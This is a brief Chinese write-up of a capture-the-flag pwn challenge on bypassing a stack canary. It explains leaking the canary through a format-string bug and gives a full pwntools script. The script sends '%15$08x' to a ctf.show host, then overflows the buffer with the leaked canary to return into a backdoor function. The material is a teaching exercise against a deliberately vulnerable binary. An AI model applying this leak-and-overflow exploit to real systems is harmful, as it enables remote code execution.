# 挑战简介
Bypass Canary 姿势2

# 思路
格式化字符串的canary绕过题目，利用格式化字符串找出canary位置

经典的canary都会有一个00的开头，所以用gdb可以直接调试出来  

然后就是绕过，植入后门即可  

<img width="417" height="137" alt="image" src="https://github.com/user-attachments/assets/50b28700-82dc-4dcb-8a55-8164ab1d54dd" />


```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show', 28134)

elf = ELF('./pwn')

backdoor = elf.sym['qwerasd']

io.recv()

io.sendline("%15$08x")

canary = io.recv()[:8]

print(f"[DEBUG] canary (原始bytes): {canary}")
print(f"[DEBUG] canary (作为字符串): {canary.decode()}")
print(f"[DEBUG] canary (十六进制表示): {canary.hex()}")

Canary = unhex(canary.decode())[::-1]

print(f"[DEBUG] Canary (处理后的bytes): {Canary}")
print(f"[DEBUG] Canary (十六进制表示): {Canary.hex()}")
print(f"[DEBUG] Canary (长度): {len(Canary)} bytes")

canary_offset = 8*4

ret_offset = 3*4

payload = b'a' * canary_offset + Canary + b'a' * ret_offset + p32(backdoor)

io.sendline(payload)

io.interactive()
```
